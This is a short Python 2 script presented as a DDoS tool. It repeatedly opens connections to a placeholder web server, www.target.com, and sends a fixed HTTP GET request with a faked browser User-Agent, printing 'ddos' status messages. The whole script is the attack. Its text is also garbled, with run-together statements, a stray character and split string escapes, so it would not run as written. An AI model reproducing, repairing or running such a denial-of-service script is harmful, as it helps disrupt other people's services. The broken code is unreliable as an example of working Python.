#!/usr/bin/env python 

import socket 
import time 
import random 
import os def main(): global target, port, payload, timeout target = "www.target.com" port = 80 payload = "GET / HTTP/1.1\r

Host: www.target.com\r

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\r

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r

Accept-Language: en-us,en;q=0.5\r

Accept-Encoding: gzip, deflate\r

Connection: keep-alive\r

\r

" timeout = 10 s print "

[+]starting ddos against www.target.com on port 80" while True: try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((target, port)) time.sleep(1) # send payload sock.send(payload) # wait for response data = sock.recv(1024) if data: print "

[+]received response from www.target.com: %s" % data else: print "

[-]www.target.com did not respond" break except Exception as e: print "

[-]error while attempting to ddos www.target.com: %s" % str(e) if __name__ == "__main__": main()